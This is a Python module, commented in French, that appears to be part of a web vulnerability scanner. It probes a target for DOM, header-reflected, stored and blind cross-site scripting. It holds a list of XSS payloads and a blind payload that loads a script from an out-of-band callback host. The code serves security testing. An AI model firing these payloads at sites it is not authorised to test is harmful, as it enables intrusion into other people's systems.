"""XSS avancé — DOM, blind, headers, stored hints."""

from __future__ import annotations

import re
import urllib.parse

import requests

from .utils import Finding, build_url_with_params, extract_forms, get_base_url, normalize_url, safe_request

DOM_SINKS = [
    "document.write", "innerHTML", "outerHTML", "eval(", "setTimeout(",
    "setInterval(", "location=", "location.href", "document.cookie",
    "$.html(", ".append(", "insertAdjacentHTML",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "{{constructor.constructor('alert(1)')()}}",
]

BLIND_XSS_PAYLOAD = '"><script src=https://{callback}/x></script>'

HEADER_XSS_PAYLOADS = {
    "User-Agent": '<script>alert(1)</script>',
    "Referer": '"><img src=x onerror=alert(1)>',
    "X-Forwarded-For": "'-alert(1)-'",
}


class XSSAdvancedScanner:
    """Scanner XSS avancé."""

    def __init__(self, target: str, session: requests.Session, oob_callback: str | None = None):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.oob_callback = oob_callback
        self.findings: list[Finding] = []

    def run_full_scan(self, urls: list[str] | None = None) -> list[Finding]:
        scan_urls = (urls or [self.target])[:10]
        self._scan_dom_sinks()
        self._scan_header_xss()
        for url in scan_urls:
            self._scan_stored_hints(url)
            self._scan_blind_xss(url)
        return self.findings

    def _scan_dom_sinks(self) -> None:
        resp = safe_request(self.session, "GET", self.target)
        if not resp:
            return
        for sink in DOM_SINKS:
            if sink in resp.text:
                # Vérifier si des params URL atteignent le sink
                if re.search(r"(location\.search|URLSearchParams|window\.location|document\.URL)", resp.text):
                    self.findings.append(
                        Finding(
                            title=f"DOM XSS potentiel — sink: {sink}",
                            severity="high",
                            category="DOM XSS",
                            url=self.target,
                            description="Source URL + sink DOM détectés dans le JavaScript",
                            evidence=sink,
                            remediation="Sanitiser les entrées avant utilisation dans les sinks DOM",
                        )
                    )

    def _scan_header_xss(self) -> None:
        for header, payload in HEADER_XSS_PAYLOADS.items():
            resp = safe_request(self.session, "GET", self.target, headers={header: payload})
            if resp and (payload in resp.text or "alert(1)" in resp.text):
                self.findings.append(
                    Finding(
                        title=f"XSS via header {header}",
                        severity="high",
                        category="XSS",
                        url=self.target,
                        description=f"Payload réfléchi depuis le header {header}",
                        evidence=payload,
                    )
                )

    def _scan_stored_hints(self, url: str) -> None:
        resp = safe_request(self.session, "GET", url)
        if not resp:
            return
        for form in extract_forms(resp.text):
            if form["method"] == "POST":
                action = urllib.parse.urljoin(url, form.get("action", ""))
                text_fields = [f["name"] for f in form["fields"] if f["type"] in ("text", "textarea", "search")]
                for field in text_fields[:2]:
                    payload = XSS_PAYLOADS[1]
                    data = {f["name"]: payload for f in form["fields"] if f["name"]}
                    data[field] = payload
                    post_resp = safe_request(self.session, "POST", action or url, data=data)
                    if post_resp and payload in post_resp.text:
                        self.findings.append(
                            Finding(
                                title=f"XSS stocké potentiel — champ '{field}'",
                                severity="high",
                                category="Stored XSS",
                                url=action or url,
                                description="Payload XSS persistant après POST",
                                evidence=payload,
                            )
                        )

    def _scan_blind_xss(self, url: str) -> None:
        if not self.oob_callback:
            return
        payload = BLIND_XSS_PAYLOAD.format(callback=self.oob_callback)
        parsed = urllib.parse.urlparse(url)
        test_url = build_url_with_params(url.split("?")[0], {"q": payload, "search": payload, "comment": payload})
        safe_request(self.session, "GET", test_url)
        self.findings.append(
            Finding(
                title="Blind XSS payload injecté",
                severity="info",
                category="Blind XSS",
                url=test_url,
                description=f"Payload OOB envoyé — vérifier {self.oob_callback}",
                evidence=payload[:100],
            )
        )
